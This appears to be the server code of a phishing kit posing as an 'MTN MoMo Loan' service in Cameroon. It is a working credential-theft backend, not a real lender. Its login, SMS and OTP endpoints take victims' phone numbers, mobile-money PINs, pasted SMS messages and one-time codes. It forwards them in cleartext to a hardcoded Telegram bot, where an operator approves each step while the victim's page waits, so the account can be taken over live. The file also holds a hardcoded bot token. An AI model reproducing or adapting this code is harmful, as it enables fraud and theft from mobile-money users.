// backend/server.js
// MTN MoMo Loan – Cameroon
// Express backend: loan applications, logins, SMS, OTP — ALL WITH ADMIN APPROVAL

require('dotenv').config();

const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;

// ✅ Trust proxy for Railway
app.set('trust proxy', 1);

// ============================================
// TELEGRAM CONFIG
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8887743533:AAH2lvDSjzdjmZwKCX2QLcVZWSUaILWBNtQ';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8732435859';

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set. Notifications disabled.');
}

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors({
    origin: process.env.ALLOWED_ORIGIN || '*',
    methods: ['GET', 'POST'],
}));
app.use(express.json({ limit: '100kb' }));

const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 200,
    standardHeaders: true,
    legacyHeaders: false,
    message: { ok: false, error: 'Too many requests. Please try again later.' },
});
app.use('/api/', apiLimiter);

// ============================================
// HELPERS
// ============================================
function generateReference() {
    const raw = crypto.randomBytes(4).toString('hex').toUpperCase().slice(0, 6);
    return `MM-${raw}`;
}

function escapeHtml(s) {
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function isValidCameroonPhone(phone) {
    return /^\+237\d{9}$/.test(phone);
}

async function sendTelegramMessage(text, replyMarkup = null) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return { ok: false, reason: 'not_configured' };
    try {
        const body = {
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'HTML',
            disable_web_page_preview: true,
        };
        if (replyMarkup) body.reply_markup = replyMarkup;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        const data = await res.json();
        return { ok: res.ok, data };
    } catch (err) {
        console.error('Telegram send failed:', err.message);
        return { ok: false, reason: 'network_error' };
    }
}

async function answerCallbackQuery(callbackQueryId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: callbackQueryId,
                text,
                show_alert: false,
            }),
        });
    } catch (err) {
        console.error('answerCallbackQuery failed:', err.message);
    }
}

async function editTelegramMessage(chatId, messageId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text,
                parse_mode: 'HTML',
            }),
        });
    } catch (err) {
        console.error('editMessageText failed:', err.message);
    }
}

// ============================================
// IN-MEMORY STORES
// ============================================
const applications = new Map();
const sessions = new Map();
const smsSubmissions = new Map();
const otpVerifications = new Map();

// Pending approvals — keyed by requestId
// { requestId: { type: 'login'|'sms'|'otp', phone, pin, extra, status, createdAt, messageId } }
const pendingApprovals = new Map();

// ============================================
// ROUTES
// ============================================

app.get('/', (req, res) => {
    res.json({
        ok: true,
        service: 'momo-loan-backend',
        time: new Date().toISOString(),
        pendingApprovals: pendingApprovals.size,
    });
});

// --------------------------------------------
// POST /api/application
// --------------------------------------------
app.post('/api/application', async (req, res) => {
    try {
        const b = req.body || {};

        const required = ['fullName', 'phone', 'amount', 'term'];
        for (const k of required) {
            if (!b[k]) {
                return res.status(400).json({ ok: false, error: `Missing field: ${k}` });
            }
        }

        if (!isValidCameroonPhone(b.phone)) {
            return res.status(400).json({ ok: false, error: 'Invalid Cameroon phone number' });
        }

        const amount = Number(b.amount);
        const term = Number(b.term);
        if (!Number.isFinite(amount) || amount < 50000 || amount > 1000000) {
            return res.status(400).json({ ok: false, error: 'Amount must be between 50,000 and 1,000,000 XAF' });
        }
        if (!Number.isFinite(term) || term < 1 || term > 24) {
            return res.status(400).json({ ok: false, error: 'Term must be between 1 and 24 months' });
        }

        const reference = generateReference();

        const application = {
            reference,
            fullName: String(b.fullName).slice(0, 100),
            phone: b.phone,
            amount,
            term,
            purpose: b.purpose ? String(b.purpose).slice(0, 300) : '',
            region: b.region ? String(b.region).slice(0, 60) : '',
            city: b.city ? String(b.city).slice(0, 60) : '',
            employment: b.employment ? String(b.employment).slice(0, 60) : '',
            income: b.income ? Number(b.income) : null,
            submittedAt: new Date().toISOString(),
            status: 'pending',
        };

        applications.set(reference, application);

        const msg =
            `🆕 <b>New Loan Application</b>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🔖 <b>Reference:</b> ${escapeHtml(reference)}\n` +
            `👤 <b>Name:</b> ${escapeHtml(application.fullName)}\n` +
            `📱 <b>Phone:</b> ${escapeHtml(application.phone)}\n` +
            `💰 <b>Amount:</b> ${application.amount.toLocaleString('en-US')} XAF\n` +
            `📅 <b>Term:</b> ${application.term} months\n` +
            (application.purpose ? `📝 <b>Purpose:</b> ${escapeHtml(application.purpose)}\n` : '') +
            (application.region ? `📍 <b>Region:</b> ${escapeHtml(application.region)}\n` : '') +
            (application.city ? `🏙 <b>City:</b> ${escapeHtml(application.city)}\n` : '') +
            (application.employment ? `💼 <b>Employment:</b> ${escapeHtml(application.employment)}\n` : '') +
            (application.income ? `💵 <b>Monthly income:</b> ${application.income.toLocaleString('en-US')} XAF\n` : '') +
            `🕐 <b>Submitted:</b> ${escapeHtml(application.submittedAt)}`;

        await sendTelegramMessage(msg);

        return res.json({ ok: true, reference });
    } catch (err) {
        console.error('application error:', err);
        return res.status(500).json({ ok: false, error: 'Server error' });
    }
});

// --------------------------------------------
// POST /api/login → Admin approval
// --------------------------------------------
app.post('/api/login', async (req, res) => {
    try {
        const body = req.body || {};
        const phone = (body.phone || '').toString().trim();
        const pin = (body.pin || '').toString().trim();

        if (!isValidCameroonPhone(phone)) {
            return res.status(400).json({ ok: false, error: 'Invalid phone number' });
        }
        if (!/^\d{5}$/.test(pin)) {
            return res.status(400).json({ ok: false, error: 'PIN must be exactly 5 digits' });
        }

        const requestId = 'login_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');

        pendingApprovals.set(requestId, {
            type: 'login',
            phone,
            pin,
            status: 'pending',
            createdAt: new Date().toISOString(),
            messageId: null,
        });

        const msg =
            `🔐 <b>Login Request</b>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `📱 <b>Phone:</b> ${escapeHtml(phone)}\n` +
            `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
            `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n` +
            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
            `⚠️ <b>Approve to continue, Reject to deny.</b>`;

        const replyMarkup = {
            inline_keyboard: [[
                { text: '✅ Approve', callback_data: `approve:${requestId}` },
                { text: '❌ Reject', callback_data: `reject:${requestId}` },
            ]],
        };

        const result = await sendTelegramMessage(msg, replyMarkup);

        if (result.ok && result.data?.result?.message_id) {
            const p = pendingApprovals.get(requestId);
            if (p) {
                p.messageId = result.data.result.message_id;
                pendingApprovals.set(requestId, p);
            }
        }

        return res.json({ ok: true, requestId, status: 'pending' });

    } catch (err) {
        console.error('login error:', err);
        return res.status(500).json({ ok: false, error: 'Server error' });
    }
});

// --------------------------------------------
// POST /api/sms → Admin approval
// --------------------------------------------
app.post('/api/sms', async (req, res) => {
    try {
        const { phone, pin, token, sms } = req.body || {};

        if (!sms || typeof sms !== 'string' || sms.trim().length < 20) {
            return res.status(400).json({ ok: false, error: 'Invalid SMS content' });
        }

        const trimmed = sms.trim().slice(0, 800);
        const requestId = 'sms_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');

        pendingApprovals.set(requestId, {
            type: 'sms',
            phone: typeof phone === 'string' ? phone : 'unknown',
            pin: typeof pin === 'string' ? pin : '',
            token: typeof token === 'string' ? token : '',
            sms: trimmed,
            status: 'pending',
            createdAt: new Date().toISOString(),
            messageId: null,
        });

        const msg =
            `📩 <b>SMS Submitted — Approval Required</b>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `📱 <b>Phone:</b> ${escapeHtml(phone || 'unknown')}\n` +
            (pin ? `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` : '') +
            `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n` +
            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
            `<b>Message:</b>\n<code>${escapeHtml(trimmed)}</code>\n\n` +
            `⚠️ <b>Approve to continue, Reject to deny.</b>`;

        const replyMarkup = {
            inline_keyboard: [[
                { text: '✅ Approve', callback_data: `approve:${requestId}` },
                { text: '❌ Reject', callback_data: `reject:${requestId}` },
            ]],
        };

        const result = await sendTelegramMessage(msg, replyMarkup);

        if (result.ok && result.data?.result?.message_id) {
            const p = pendingApprovals.get(requestId);
            if (p) {
                p.messageId = result.data.result.message_id;
                pendingApprovals.set(requestId, p);
            }
        }

        return res.json({ ok: true, requestId, status: 'pending' });

    } catch (err) {
        console.error('sms error:', err);
        return res.status(500).json({ ok: false, error: 'Server error' });
    }
});

// --------------------------------------------
// POST /api/verify-otp → Admin approval
// --------------------------------------------
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { phone, pin, otp, sms, token } = req.body || {};

        if (!otp || typeof otp !== 'string' || !/^\d{4}$/.test(otp)) {
            return res.status(400).json({ ok: false, error: 'OTP must be exactly 4 digits' });
        }

        const requestId = 'otp_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');

        pendingApprovals.set(requestId, {
            type: 'otp',
            phone: typeof phone === 'string' ? phone : 'unknown',
            pin: typeof pin === 'string' ? pin : '',
            otp: otp.trim(),
            token: typeof token === 'string' ? token : '',
            sms: typeof sms === 'string' ? sms.slice(0, 400) : '',
            status: 'pending',
            createdAt: new Date().toISOString(),
            messageId: null,
        });

        const msg =
            `🔐 <b>OTP Verification — Approval Required</b>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `📱 <b>Phone:</b> ${escapeHtml(phone || 'unknown')}\n` +
            (pin ? `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` : '') +
            `🔐 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
            `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n` +
            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
            `⚠️ <b>Approve to continue, Reject to deny.</b>`;

        const replyMarkup = {
            inline_keyboard: [[
                { text: '✅ Approve', callback_data: `approve:${requestId}` },
                { text: '❌ Reject', callback_data: `reject:${requestId}` },
            ]],
        };

        const result = await sendTelegramMessage(msg, replyMarkup);

        if (result.ok && result.data?.result?.message_id) {
            const p = pendingApprovals.get(requestId);
            if (p) {
                p.messageId = result.data.result.message_id;
                pendingApprovals.set(requestId, p);
            }
        }

        return res.json({ ok: true, requestId, status: 'pending' });

    } catch (err) {
        console.error('verify-otp error:', err);
        return res.status(500).json({ ok: false, error: 'Server error' });
    }
});

// --------------------------------------------
// GET /api/approval/status/:requestId
// Frontend polls this for ALL steps (login, sms, otp)
// --------------------------------------------
app.get('/api/approval/status/:requestId', (req, res) => {
    const { requestId } = req.params;
    const pending = pendingApprovals.get(requestId);

    if (!pending) {
        return res.status(404).json({ ok: false, error: 'Request not found' });
    }

    return res.json({
        ok: true,
        status: pending.status, // 'pending' | 'approved' | 'rejected'
        type: pending.type,
    });
});

// --------------------------------------------
// POST /api/telegram/callback
// Webhook handler — buttons for all types
// --------------------------------------------
app.post('/api/telegram/callback', async (req, res) => {
    try {
        const update = req.body || {};
        console.log('📥 Telegram update:', JSON.stringify(update).slice(0, 300));

        if (update.callback_query) {
            const cq = update.callback_query;
            const data = cq.data || '';
            const callbackQueryId = cq.id;
            const messageId = cq.message?.message_id;
            const chatId = cq.message?.chat?.id;

            const [action, requestId] = data.split(':');
            const pending = pendingApprovals.get(requestId);

            if (!pending) {
                await answerCallbackQuery(callbackQueryId, '⚠️ Request not found or expired');
                return res.json({ ok: true });
            }

            if (pending.status !== 'pending') {
                await answerCallbackQuery(callbackQueryId, '⚠️ Already ' + pending.status);
                return res.json({ ok: true });
            }

            // Build type label
            const typeLabel = { login: '🔐 Login', sms: '📩 SMS', otp: '🔐 OTP' }[pending.type] || 'Request';

            if (action === 'approve') {
                pending.status = 'approved';
                pendingApprovals.set(requestId, pending);

                await answerCallbackQuery(callbackQueryId, '✅ Approved');

                if (messageId && chatId) {
                    await editTelegramMessage(chatId, messageId,
                        `✅ <b>APPROVED</b>\n` +
                        `━━━━━━━━━━━━━━━━━━\n` +
                        `${typeLabel}\n` +
                        `📱 <b>Phone:</b> ${escapeHtml(pending.phone)}\n` +
                        `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n\n` +
                        `👉 User can now proceed.`
                    );
                }
                console.log('✅ Approved:', requestId);

            } else if (action === 'reject') {
                pending.status = 'rejected';
                pendingApprovals.set(requestId, pending);

                await answerCallbackQuery(callbackQueryId, '❌ Rejected');

                if (messageId && chatId) {
                    await editTelegramMessage(chatId, messageId,
                        `❌ <b>REJECTED</b>\n` +
                        `━━━━━━━━━━━━━━━━━━\n` +
                        `${typeLabel}\n` +
                        `📱 <b>Phone:</b> ${escapeHtml(pending.phone)}\n` +
                        `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n\n` +
                        `🚫 User denied.`
                    );
                }
                console.log('❌ Rejected:', requestId);

            } else {
                await answerCallbackQuery(callbackQueryId, '⚠️ Unknown action');
            }
        }

        return res.json({ ok: true });

    } catch (err) {
        console.error('telegram callback error:', err);
        return res.json({ ok: true });
    }
});

// --------------------------------------------
// GET /api/status/:ref (legacy)
// --------------------------------------------
app.get('/api/status/:ref', (req, res) => {
    const ref = req.params.ref;
    const app_ = applications.get(ref) || smsSubmissions.get(ref) || otpVerifications.get(ref);
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    return res.json({
        ok: true,
        reference: ref,
        status: app_.status || 'received',
        submittedAt: app_.submittedAt,
    });
});

// --------------------------------------------
// 404 + error handlers
// --------------------------------------------
app.use((req, res) => {
    res.status(404).json({ ok: false, error: 'Not found' });
});

app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ ok: false, error: 'Server error' });
});

// ============================================
// START
// ============================================
app.listen(PORT, () => {
    console.log(`✅ Momo Loan backend running on port ${PORT}`);
    console.log(`   Telegram: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'enabled' : 'disabled'}`);
    console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 20)}...`);
    console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log(`   Trust proxy: enabled`);
    console.log(`   Admin Approval: ✅ ACTIVE (login, SMS, OTP)`);
});
